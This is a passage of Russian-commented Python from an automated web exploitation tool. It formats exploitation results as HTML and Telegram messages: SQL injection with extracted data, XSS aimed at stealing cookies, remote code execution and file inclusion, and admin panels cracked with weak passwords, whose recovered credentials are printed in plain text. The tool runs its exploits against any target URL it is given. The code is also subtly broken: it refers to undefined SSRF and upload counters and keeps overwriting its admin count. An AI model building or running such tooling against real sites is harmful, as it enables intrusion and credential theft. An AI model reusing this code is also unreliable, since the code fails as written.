            .extracted-data { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; max-height: 200px; overflow-y: auto; }
            .admin-panel { background: #f9f9f9; border-left: 4px solid #f39c12; padding: 15px; margin: 15px 0; border-radius: 4px; }
            .admin-compromised { border-left: 4px solid #e74c3c; }
            .stats { background: #f9f9f9; border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 4px; }
            .footer { margin-top: 30px; font-size: 0.8em; color: #7f8c8d; text-align: center; }
            .credentials { background: #e74c3c; color: white; padding: 5px 8px; border-radius: 4px; font-family: monospace; }
            .method { display: inline-block; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
            .get { background: #3498db; color: white; }
            .post { background: #2ecc71; color: white; }
            .rec-box { background: #fff8e1; border-left: 4px solid #ffc107; padding: 10px; margin: 10px 0; border-radius: 4px; }
            .technique-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 10px; margin: 10px 0; border-radius: 4px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔍 ДЕТАЛЬНЫЙ ОТЧЕТ ОБ ЭКСПЛУАТАЦИИ УЯЗВИМОСТЕЙ</h1>
    """
    
    # Группируем по типам уязвимостей
    for result in results:
        # Проверяем, что это словарь и имеет ключ 'type'
        if not isinstance(result, dict):
            continue
            
        # Обрабатываем элементы, у которых есть ключ 'type'
        if 'type' in result:
            if result['type'] == 'SQL_INJECTION_DATA':
                sql_count += 1
                html += f"""
                <div class="vulnerability">
                    <h2>🔴 ЭКСПЛУАТАЦИЯ SQL-ИНЪЕКЦИИ #{sql_count}</h2>
                    <div class="vuln-details">
                        <p><strong>URL точки внедрения:</strong> {result['url']}</p>
                        <p><strong>Метод запроса:</strong> <span class="method {'get' if result['method'].lower() == 'get' else 'post'}">{result['method'].upper()}</span></p>
                        <p><strong>Уязвимый параметр:</strong> <code>{result['field']}</code></p>
                        
                        <p><strong>Использованный payload:</strong></p>
                        <pre class="payload">{escape_html(result['payload'])}</pre>
                        
                        <p><strong>Извлеченные данные:</strong></p>
                        <pre class="extracted-data">{escape_html(result['extracted_data'])}</pre>
                        
                        <div class="technique-box">
                            <p><strong>Метод эксплуатации:</strong> Внедрение SQL-кода для извлечения данных из БД через UNION-based или error-based инъекцию</p>
                        </div>
                        
                        <div class="rec-box">
                            <p><strong>Рекомендации:</strong></p>
                            <ul>
                                <li>Использовать подготовленные выражения (prepared statements)</li>
                                <li>Внедрить параметризованные запросы</li>
                                <li>Применять ORM-фреймворки</li>
                                <li>Реализовать правильную валидацию входных данных</li>
                                <li>Применять принцип наименьших привилегий для БД-пользователя</li>
                            </ul>
                        </div>
                    </div>
                </div>
                """
            
            elif result['type'] == 'XSS_EXPLOITED':
                xss_count += 1
                html += f"""
                <div class="vulnerability">
                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #{xss_count}</h2>
                    <div class="vuln-details">
                        <p><strong>URL точки внедрения:</strong> {result['url']}</p>
                        <p><strong>Метод запроса:</strong> <span class="method {'get' if result['method'].lower() == 'get' else 'post'}">{result['method'].upper()}</span></p>
                        <p><strong>Уязвимый параметр:</strong> <code>{result['field']}</code></p>
                        
                        <p><strong>Использованный payload:</strong></p>
                        <pre class="payload">{escape_html(result['payload'])}</pre>
                        
                        <p><strong>Идентификатор трекинга:</strong> {result['tracking_id']}</p>
                        
                        <div class="technique-box">
                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
                        </div>
                        
                        <div class="rec-box">
                            <p><strong>Рекомендации:</strong></p>
                            <ul>
                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
                                <li>Применять фреймворки с автоматическим экранированием</li>
                                <li>Использовать атрибут HttpOnly для cookies</li>
                                <li>Внедрить строгую валидацию входных данных</li>
                            </ul>
                        </div>
                    </div>
                </div>
                """
            
            elif result['type'] == 'RCE_EXPLOITED':
                rce_count += 1
                
                # Добавляем более подробное описание типа RCE
                rce_type_desc = ""
                if result['payload_type'] == 'os_command':
                    rce_type_desc = "Внедрение системных команд ОС"
                elif result['payload_type'] == 'php_code':
                    rce_type_desc = "Выполнение PHP кода"
                elif result['payload_type'] == 'filter_wrappers':
                    rce_type_desc = "Использование PHP filter wrapper для чтения исходного кода"
                elif result['payload_type'] == 'path_traversal':
                    rce_type_desc = "Выход за пределы корневой директории (path traversal)"
                elif result['payload_type'] == 'file_upload':
                    rce_type_desc = "Загрузка вредоносного файла"
                elif result['payload_type'] == 'include':
                    rce_type_desc = "Включение произвольного файла (LFI/RFI)"
                
                html += f"""
                <div class="vulnerability">
                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #{rce_count}</h2>
                    <div class="vuln-details">
                        <p><strong>URL точки внедрения:</strong> {result['url']}</p>
                        <p><strong>Метод запроса:</strong> <span class="method {'get' if result['method'].lower() == 'get' else 'post'}">{result['method'].upper()}</span></p>
                        <p><strong>Уязвимый параметр:</strong> <code>{result['field']}</code></p>
                        
                        <p><strong>Использованный payload:</strong></p>
                        <pre class="payload">{escape_html(result['payload'])}</pre>
                        
                        <p><strong>Тип эксплуатации:</strong> {result['payload_type']}</p>
                        
                        <div class="technique-box">
                            <p><strong>Техника эксплуатации:</strong> {rce_type_desc}</p>
                        </div>
                        
                        <p><strong>Результат выполнения:</strong></p>
                        <pre class="extracted-data">{escape_html(result['extracted_data'])}</pre>
                        
                        <div class="rec-box">
                            <p><strong>Рекомендации:</strong></p>
                            <ul>
                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
                                <li>Проверять имена файлов и пути через белые списки</li>
                                <li>Ограничивать доступ к файловой системе</li>
                                <li>Использовать chroot окружения при необходимости</li>
                                <li>Применять последние обновления безопасности</li>
                                <li>Использовать WAF для блокировки подозрительных запросов</li>
                            </ul>
                        </div>
                    </div>
                </div>
                """
        
        # Обрабатываем элементы для админ-страниц
        elif 'pages' in result and isinstance(result['pages'], list):
            admin_count = len(result['pages'])
            
            successful_logins = 0
            for page in result['pages']:
                if page['status'] == 'success':
                    successful_logins += 1
            
            html += f"""
            <div class="vulnerability">
                <h2>🔴 ОБНАРУЖЕНЫ АДМИНИСТРАТИВНЫЕ ИНТЕРФЕЙСЫ ({admin_count})</h2>
            """
            
            if successful_logins > 0:
                html += f"""
                <div class="vuln-details">
                    <p style="color: #e74c3c; font-weight: bold; font-size: 1.2em;">⚠️ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: {successful_logins} административных интерфейсов взломаны</p>
                """
            
            for i, page in enumerate(result['pages'], 1):
                if page['status'] == 'success':
                    html += f"""
                    <div class="admin-panel admin-compromised">
                        <h3>🔹 Админ-панель #{i}</h3>
                        <p><strong>URL:</strong> {page['url']}</p>
                        <p><strong>Статус:</strong> <span style="color: red; font-weight: bold;">ВЗЛОМАНА ⚠️</span></p>
                        <p><strong>Учетные данные:</strong> <span class="credentials">{page['credentials']['username']}:{page['credentials']['password']}</span></p>
                        
                        <div class="technique-box">
                            <p><strong>Метод эксплуатации:</strong> Подбор стандартных/слабых паролей</p>
                        </div>
                        
                        <div class="rec-box">
                            <p><strong>Рекомендации:</strong></p>
                            <ul>
                                <li>Немедленно сменить пароль на сложный (минимум 12 символов, буквы, цифры, спецсимволы)</li>
                                <li>Внедрить двухфакторную аутентификацию</li>
                                <li>Ограничить доступ к панели по IP-адресу</li>
                                <li>Использовать защиту от перебора (капча, временная блокировка)</li>
                                <li>Изменить стандартные пути к админ-панели</li>
                            </ul>
                        </div>
                    </div>
                    """
                else:
                    html += f"""
                    <div class="admin-panel">
                        <h3>🔹 Админ-панель #{i}</h3>
                        <p><strong>URL:</strong> {page['url']}</p>
                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
                    """
                    
                    if 'title' in page:
                        html += f"""
                        <p><strong>Заголовок страницы:</strong> {escape_html(page['title'])}</p>
                        """
                    
                    html += f"""
                        <div class="rec-box">
                            <p><strong>Рекомендации:</strong></p>
                            <ul>
                                <li>Использовать сложные пароли</li>
                                <li>Внедрить двухфакторную аутентификацию</li>
                                <li>Ограничить доступ к панели по IP-адресу</li>
                                <li>Изменить стандартные пути к админ-панели</li>
                            </ul>
                        </div>
                    </div>
                    """
            
            html += """
                </div>
            </div>
            """
    
    # Добавляем общую статистику
    total_vulnerabilities = sql_count + xss_count + rce_count + admin_count
    html += f"""
    <div class="stats">
        <h2>📊 СТАТИСТИКА УЯЗВИМОСТЕЙ</h2>
        <p><strong>Всего уязвимостей:</strong> {total_vulnerabilities}</p>
    """
    
    if sql_count > 0:
        html += f"<p><strong>SQL-инъекции:</strong> {sql_count}</p>\n"
    if xss_count > 0:
        html += f"<p><strong>XSS-уязвимости:</strong> {xss_count}</p>\n"
    if rce_count > 0:
        html += f"<p><strong>RCE-уязвимости:</strong> {rce_count}</p>\n"
        if ssrf_count > 0:
            html += f"<p><strong>SSRF-уязвимости:</strong> {ssrf_count}</p>\n"
        if upload_count > 0:
            html += f"<p><strong>File Upload уязвимости:</strong> {upload_count}</p>\n"
    if admin_count > 0:
        html += f"<p><strong>Админ-панели:</strong> {admin_count}</p>\n"
    
    
    html += """
    </div>
    """
    
    # Добавляем временную метку
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html += f"""
            <div class="footer">
                <p>Отчет сгенерирован: {current_time}</p>
            </div>
        </div>
    </body>
    </html>
    """
    
    return html

def exploit_target(target_url):
    """основная функция для эксплуатации"""
    try:
        exploiter = WebExploiter(target_url)
        results = exploiter.run_exploits()
        
        # Генерируем HTML-отчет
        html_report = format_results_for_html(results)
        
        # Формируем текстовый отчет для Telegram
        full_message = format_results_for_telegram(results)
        
        # Если текстовый отчет слишком длинный (более 10000 символов),
        # возвращаем только сообщение о том, что отчет доступен в HTML-формате
        if isinstance(full_message, list) and len(full_message) > 0:
            total_length = sum(len(msg) for msg in full_message)
            if total_length > 10000:
                short_message = [
                    f"🔍 <b>Отчет об эксплуатации уязвимостей для {target_url}</b>\n\n"
                    f"⚠️ Отчет слишком большой для отображения в Telegram.\n\n"
                    f"📊 <b>Краткая статистика:</b>\n"
                ]
                
                # Считаем статистику
                sql_count = sum(1 for r in results if isinstance(r, dict) and r.get('type') == 'SQL_INJECTION_DATA')
                xss_count = sum(1 for r in results if isinstance(r, dict) and r.get('type') == 'XSS_EXPLOITED')
                rce_count = sum(1 for r in results if isinstance(r, dict) and r.get('type') == 'RCE_EXPLOITED')
                admin_pages = [r for r in results if isinstance(r, dict) and 'pages' in r]
                admin_count = sum(len(r['pages']) for r in admin_pages) if admin_pages else 0
                
                total_vulns = sql_count + xss_count + rce_count + admin_count
                
                if total_vulns > 0:
                    short_message[0] += f"🔸 Всего уязвимостей: {total_vulns}\n"
                    if sql_count > 0:
                        short_message[0] += f"🔸 SQL-инъекции: {sql_count}\n"
                    if xss_count > 0:
                        short_message[0] += f"🔸 XSS-уязвимости: {xss_count}\n"
                    if rce_count > 0:
                        short_message[0] += f"🔸 RCE-уязвимости: {rce_count}\n"
                    if admin_count > 0:
                        short_message[0] += f"🔸 Админ-панели: {admin_count}\n"
                else:
                    short_message[0] += "Уязвимостей не обнаружено.\n"
                
                short_message[0] += "\n⚠️ Пожалуйста, просмотрите HTML-отчет для получения подробной информации."
                
                return short_message, html_report
        
        return full_message, html_report
    except Exception as e:
        error_msg = str(e)
        logger.error(f"ошибка при эксплуатации: {error_msg}")
        
        # Генерируем HTML-отчет об ошибке
        error_html = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Ошибка при сканировании</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; line-height: 1.6; }}
                .container {{ max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
                h1 {{ color: #e74c3c; border-bottom: 2px solid #e74c3c; padding-bottom: 10px; }}
                .error-box {{ background: #fdecea; border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 4px; }}
                .footer {{ margin-top: 30px; font-size: 0.8em; color: #7f8c8d; text-align: center; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Ошибка при сканировании</h1>
                <div class="error-box">
                    <p>{error_msg[:1000] + '...' if len(error_msg) > 1000 else error_msg}</p>
                </div>
                <div class="footer">
                    <p>Отчет сгенерирован: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Создаем короткое сообщение об ошибке для Telegram
        # Обрезаем сообщение об ошибке, если оно слишком длинное
        if len(error_msg) > 200:
            error_msg = error_msg[:197] + "..."
            
        error_message = [f"❌ Ошибка при эксплуатации: {error_msg}"]
        
        # Можно добавить дополнительную информацию в HTML-отчет
        try:
            # Если есть объект exploiter, пытаемся получить какую-то информацию о результатах
            if 'exploiter' in locals() and hasattr(exploiter, 'results') and exploiter.results:
                error_html += f"""
                <div class="partial-results">
                    <h2>Частичные результаты перед ошибкой</h2>
                    <p>Было найдено {len(exploiter.results)} результатов до ошибки.</p>
                </div>
                """
        except:
            pass
            
        return error_message, error_html
